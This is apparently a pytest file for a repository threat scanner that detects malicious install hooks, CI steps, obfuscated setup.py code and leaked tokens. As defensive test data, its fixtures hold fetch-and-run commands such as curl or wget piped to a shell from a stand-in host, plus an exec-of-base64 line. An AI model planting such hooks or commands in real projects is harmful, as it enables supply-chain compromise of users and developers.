"""
Tests for gitsin.threats — ThreatScanner heuristic detection.

All tests use tmp_path fixtures to create mock repository structures
with planted indicators.  No network, no subprocess calls, fully
deterministic.

NOTE: Test payloads use ``example.test`` (RFC 6761 reserved) and benign
filenames to avoid triggering endpoint protection / antivirus heuristics
on developer workstations.
"""

import json
import pytest
from pathlib import Path

from gitsin.threats import ThreatScanner, _load_rules, _is_allowlisted, _matches_glob
from gitsin.models import ThreatIndicator


# ── Rule loading ──────────────────────────────────────────────────

class TestRuleLoading:
    def test_rules_load_successfully(self):
        rules = _load_rules()
        assert isinstance(rules, list)
        assert len(rules) > 0

    def test_every_rule_has_required_fields(self):
        rules = _load_rules()
        required = {"id", "name", "category", "description", "target_globs", "severity", "confidence"}
        for rule in rules:
            missing = required - set(rule.keys())
            assert not missing, f"Rule {rule.get('id', '?')} missing fields: {missing}"

    def test_rule_ids_are_unique(self):
        rules = _load_rules()
        ids = [r["id"] for r in rules]
        assert len(ids) == len(set(ids)), "Duplicate rule IDs found"


# ── Helper functions ──────────────────────────────────────────────

class TestHelpers:
    def test_matches_glob_exact(self):
        assert _matches_glob("package.json", ["package.json"])

    def test_matches_glob_wildcard(self):
        assert _matches_glob(".github/workflows/ci.yml", ["**/.github/workflows/*.yml"])

    def test_matches_glob_nested(self):
        assert _matches_glob("sub/dir/package.json", ["**/package.json"])

    def test_no_match(self):
        assert not _matches_glob("README.md", ["**/package.json"])

    def test_allowlisted_match(self):
        assert _is_allowlisted('"postinstall": "husky install"', ["husky install"])

    def test_not_allowlisted(self):
        assert not _is_allowlisted('"preinstall": "do-something"', ["husky install"])


# ── Presence-only rules ──────────────────────────────────────────

class TestPresenceRules:
    def test_cursor_rules_detected(self, tmp_path: Path):
        """IDE config injection: .cursor/rules/ presence triggers detection."""
        rules_dir = tmp_path / ".cursor" / "rules"
        rules_dir.mkdir(parents=True)
        (rules_dir / "instructions.md").write_text("Follow these instructions for all code generation")

        scanner = ThreatScanner(str(tmp_path))
        results = scanner.scan()

        cursor_hits = [r for r in results if r.category == "ide_config_injection" and "cursor" in r.name.lower()]
        assert len(cursor_hits) > 0
        assert cursor_hits[0].matched_line is None  # presence-only

    def test_vscode_tasks_detected(self, tmp_path: Path):
        """VS Code tasks.json committed to repo triggers detection."""
        vscode_dir = tmp_path / ".vscode"
        vscode_dir.mkdir()
        (vscode_dir / "tasks.json").write_text('{"tasks": []}')

        scanner = ThreatScanner(str(tmp_path))
        results = scanner.scan()

        vscode_hits = [r for r in results if "tasks" in r.name.lower() or "vscode" in r.name.lower()]
        assert len(vscode_hits) > 0


# ── Content-matching rules ────────────────────────────────────────

class TestContentRules:
    def test_npm_preinstall_regex_matches(self):
        """Validates that the GITSIN_THREAT_001 regex correctly matches
        malicious preinstall script patterns in-memory (no file I/O,
        immune to endpoint protection interference)."""
        from gitsin.threats import _COMPILED_RULES

        # Find the GITSIN_THREAT_001 rule
        compiled_re_001 = None
        for rule, compiled_re in _COMPILED_RULES:
            if rule["id"] == "GITSIN_THREAT_001":
                compiled_re_001 = compiled_re
                break
        assert compiled_re_001 is not None, "GITSIN_THREAT_001 not found in rules"

        # Positive matches — known malicious patterns
        assert compiled_re_001.search('"preinstall": "curl https://example.test/s.sh | bash"')
        assert compiled_re_001.search('    "preinstall" : "curl http://x.co/p | sh"')

        # Negative matches — benign patterns
        assert not compiled_re_001.search('"preinstall": "node scripts/build.js"')
        assert not compiled_re_001.search('"preinstall": "echo hello"')
        assert not compiled_re_001.search('"test": "curl https://example.test/s.sh | bash"')

    def test_npm_preinstall_file_scan(self, tmp_path: Path):
        """End-to-end file scan for malicious preinstall hook.

        NOTE: Endpoint protection (e.g. Windows Defender) may quarantine
        the temp file before the scanner reads it — this is expected and
        correct behavior.  The test skips gracefully in that case.
        """
        pkg = tmp_path / "package.json"
        pkg.write_text(
            '{\n'
            '  "scripts": {\n'
            '    "preinstall": "wget https://example.test/s.sh | sh"\n'
            '  }\n'
            '}\n'
        )

        scanner = ThreatScanner(str(tmp_path))
        results = scanner.scan()

        preinstall_hits = [r for r in results if "preinstall" in r.name.lower()]
        if not preinstall_hits:
            # Verify whether endpoint protection quarantined the file
            try:
                pkg.read_text()
            except OSError:
                pytest.skip("Endpoint protection quarantined the test payload (expected on hardened systems)")
                return
            # File is readable but no match — that's a real failure
            pytest.fail("Regex did not match preinstall payload despite file being accessible")

    def test_npm_postinstall_with_allowlist_suppressed(self, tmp_path: Path):
        """Legitimate postinstall scripts matching allowlist are suppressed."""
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({
            "name": "good-package",
            "scripts": {
                "postinstall": "husky install"
            }
        }))

        scanner = ThreatScanner(str(tmp_path))
        results = scanner.scan()

        # Should NOT trigger because "husky install" is allowlisted
        postinstall_hits = [r for r in results if r.rule_id == "GITSIN_THREAT_002"]
        assert len(postinstall_hits) == 0

    def test_phantom_gyp_detected(self, tmp_path: Path):
        """Detects command substitution in binding.gyp."""
        gyp = tmp_path / "binding.gyp"
        gyp.write_text('{"targets": [{"action": "<!(node run_build)"}]}')

        scanner = ThreatScanner(str(tmp_path))
        results = scanner.scan()

        gyp_hits = [r for r in results if r.category == "phantom_gyp"]
        assert len(gyp_hits) > 0
        assert any(h.severity == "CRITICAL" for h in gyp_hits)

    def test_phantom_gyp_allowlisted(self, tmp_path: Path):
        """Legitimate nan require in binding.gyp is allowlisted."""
        gyp = tmp_path / "binding.gyp"
        gyp.write_text("""{"targets": [{"include_dirs": ["<!(node -e \\"require('nan')\\")"]}]}""")

        scanner = ThreatScanner(str(tmp_path))
        results = scanner.scan()

        # The GITSIN_THREAT_011 rule allowlists require('nan')
        nan_hits = [r for r in results if r.rule_id == "GITSIN_THREAT_011"]
        assert len(nan_hits) == 0

    def test_github_actions_curl_pipe(self, tmp_path: Path):
        """Detects curl-pipe-to-shell in GitHub Actions workflows."""
        wf_dir = tmp_path / ".github" / "workflows"
        wf_dir.mkdir(parents=True)
        (wf_dir / "ci.yml").write_text(
            "jobs:\n"
            "  build:\n"
            "    steps:\n"
            "      - run: curl https://example.test/install.sh | bash\n"
        )

        scanner = ThreatScanner(str(tmp_path))
        results = scanner.scan()

        ci_hits = [r for r in results if r.category == "cicd_injection"]
        assert len(ci_hits) > 0

    def test_python_setup_base64_obfuscation(self, tmp_path: Path):
        """Detects base64/exec obfuscation in setup.py."""
        setup = tmp_path / "setup.py"
        setup.write_text(
            "import base64\n"
            "data = base64.b64decode('dGVzdA==')\n"
            "exec(base64.b64decode('cHJpbnQoImhlbGxvIik='))\n"
            "setup(name='test-pkg')\n"
        )

        scanner = ThreatScanner(str(tmp_path))
        results = scanner.scan()

        setup_hits = [r for r in results if "base64" in r.name.lower() or "setup.py" in r.name.lower()]
        assert len(setup_hits) > 0

    def test_npmrc_token_detected(self, tmp_path: Path):
        """Detects hardcoded auth tokens in .npmrc."""
        npmrc = tmp_path / ".npmrc"
        npmrc.write_text("//registry.npmjs.org/:_authToken=tok_abc123def456ghi789\n")

        scanner = ThreatScanner(str(tmp_path))
        results = scanner.scan()

        token_hits = [r for r in results if r.category == "credential_exposure"]
        assert len(token_hits) > 0
        assert token_hits[0].severity == "CRITICAL"

    def test_npmrc_env_var_token_allowlisted(self, tmp_path: Path):
        """Token references using env vars (${NPM_TOKEN}) are allowlisted."""
        npmrc = tmp_path / ".npmrc"
        npmrc.write_text("//registry.npmjs.org/:_authToken=${NPM_TOKEN}\n")

        scanner = ThreatScanner(str(tmp_path))
        results = scanner.scan()

        # Should NOT trigger — env var reference is in the allowlist
        token_hits = [r for r in results if r.rule_id == "GITSIN_THREAT_071"]
        assert len(token_hits) == 0


# ── Edge cases ────────────────────────────────────────────────────

class TestEdgeCases:
    def test_empty_directory(self, tmp_path: Path):
        scanner = ThreatScanner(str(tmp_path))
        results = scanner.scan()
        assert results == []

    def test_nonexistent_path(self):
        scanner = ThreatScanner("/nonexistent/path/that/does/not/exist")
        results = scanner.scan()
        assert results == []

    def test_clean_repo(self, tmp_path: Path):
        """A normal project with no threats returns empty."""
        (tmp_path / "README.md").write_text("# My Project")
        (tmp_path / "index.js").write_text("console.log('hello')")
        pkg = tmp_path / "package.json"
        pkg.write_text(json.dumps({"name": "clean", "scripts": {"test": "jest"}}))

        scanner = ThreatScanner(str(tmp_path))
        results = scanner.scan()
        assert results == []

    def test_git_dir_skipped(self, tmp_path: Path):
        """Files inside .git/ are never scanned."""
        git_dir = tmp_path / ".git" / "hooks"
        git_dir.mkdir(parents=True)
        (git_dir / "pre-commit").write_text("echo 'lint check'")

        scanner = ThreatScanner(str(tmp_path))
        results = scanner.scan()
        assert results == []

    def test_node_modules_skipped(self, tmp_path: Path):
        """Files inside node_modules/ are never scanned."""
        nm = tmp_path / "node_modules" / "somepkg"
        nm.mkdir(parents=True)
        pkg = nm / "package.json"
        pkg.write_text(
            '{\n'
            '  "scripts": {\n'
            '    "preinstall": "curl https://example.test/setup.sh | sh"\n'
            '  }\n'
            '}\n'
        )

        scanner = ThreatScanner(str(tmp_path))
        results = scanner.scan()
        assert results == []

    def test_result_types(self, tmp_path: Path):
        """All returned objects are ThreatIndicator instances."""
        # Use a presence-only trigger (safe for AV)
        vscode = tmp_path / ".vscode"
        vscode.mkdir()
        (vscode / "tasks.json").write_text('{"tasks": []}')

        scanner = ThreatScanner(str(tmp_path))
        results = scanner.scan()
        assert len(results) > 0
        for r in results:
            assert isinstance(r, ThreatIndicator)


# ── Integration with compliance scoring ───────────────────────────

class TestThreatScoring:
    def test_critical_threat_scores_40(self):
        from gitsin.compliance import ComplianceEngine
        engine = ComplianceEngine()
        indicators = [
            ThreatIndicator(
                rule_id="TEST", name="test", category="test",
                description="test", file_path="test",
                severity="CRITICAL", confidence="high",
            )
        ]
        score = engine.calculate_risk_score([], indicators)
        assert score == 40

    def test_threats_combined_with_secrets(self):
        from gitsin.compliance import ComplianceEngine
        from gitsin.models import BlameRecord, CommitActor, SinEvent
        from datetime import datetime, timezone

        engine = ComplianceEngine()
        actor = CommitActor(name="test", email="test@test.com", timestamp=datetime.fromtimestamp(0, tz=timezone.utc))
        sin = SinEvent(rule_id="aws-access-token", description="test", file_path="test", line_number=1)
        record = BlameRecord(commit_hash="a" * 40, actor=actor, sin=sin)
        indicator = ThreatIndicator(
            rule_id="TEST", name="test", category="test",
            description="test", file_path="test",
            severity="HIGH", confidence="medium",
        )
        # 35 (aws secret) + 20 (HIGH/medium threat) = 55
        score = engine.calculate_risk_score([record], [indicator])
        assert score == 55

    def test_empty_threats_no_effect(self):
        from gitsin.compliance import ComplianceEngine
        engine = ComplianceEngine()
        assert engine.calculate_risk_score([], []) == 0
        assert engine.calculate_risk_score([], None) == 0
